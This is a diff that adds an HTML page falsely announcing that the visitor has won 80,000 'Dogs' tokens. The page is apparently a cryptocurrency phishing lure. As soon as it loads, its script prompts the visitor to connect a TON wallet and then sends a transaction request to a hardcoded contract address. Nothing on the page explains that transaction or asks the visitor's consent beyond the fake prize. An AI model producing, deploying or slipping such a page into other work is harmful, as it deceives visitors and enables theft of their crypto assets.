@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Congratulations! You Won 80000 Dogs Tokens</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f8ff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        .container {
+            padding: 20px;
+            background-color: white;
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            color: #333;
+        }
+        .token {
+            font-size: 50px;
+            margin: 20px 0;
+        }
+        .connect-button {
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎉 Congratulations! 🎉</h1>
+        <p>You have won 80000 Dogs Tokens</p>
+        <div class="token">80000 🐶 Tokens</div>
+        <div id="ton-connect" class="connect-button"></div>
+    </div>
+
+    <!-- Include TON Connect UI -->
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <script>
+        // Initialize TON Connect UI with your manifest URL
+        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+            manifestUrl: 'https://dogsclaim.42web.io/tonconnect-manifest.json',  // Update with your actual URL
+            buttonRootId: 'ton-connect'
+        });
+
+        async function connectToWallet() {
+            try {
+                const connectedWallet = await tonConnectUI.connectWallet();
+                console.log(connectedWallet);
+
+                // Trigger the interaction with the smart contract
+                await triggerTransaction();
+            } catch (error) {
+                console.error("Error connecting to wallet:", error);
+            }
+        }
+
+        // Function to trigger the transaction
+        async function triggerTransaction() {
+            try {
+                const payload = {
+                    to: 'EQBvL1b1vvi-yXP_leOiX3tsOBawWItXOf9FmB0xCl6chsx5', // Replace with your smart contract address
+                    amount: '0', // No additional TON needed to send
+                    stateInit: '', // Contract state initialization (if needed)
+                    data: '' // No additional data needed as contract handles it
+                };
+
+                const result = await tonConnectUI.sendTransaction(payload);
+                console.log("Transaction result:", result);
+            } catch (error) {
+                console.error("Error triggering transaction:", error);
+            }
+        }
+
+    
+        connectToWallet();
+    </script>
+</body>
+</html>
